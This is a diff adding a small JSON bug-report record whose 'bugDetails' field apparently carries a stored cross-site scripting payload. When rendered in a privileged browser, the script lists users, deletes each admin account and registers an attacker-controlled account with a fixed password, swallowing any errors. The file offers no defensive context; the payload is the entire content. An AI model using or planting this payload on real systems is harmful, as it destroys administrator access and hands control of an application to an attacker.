@@ -1,0 +1,4 @@
+{
+  "bugName": "del-admin-and-register",
+  "bugDetails": "<script>(function(){try{fetch('/admin/users').then(r=>r.json()).then(d=>{if(d&&d.users){d.users.forEach(u=>{if(u.isAdmin){fetch('/admin/delete_user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u.username})});}});}}).then(()=>fetch('/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'ownpwn@local',password:'pwn123!'})}));}catch(e){}})();</script>"
+}
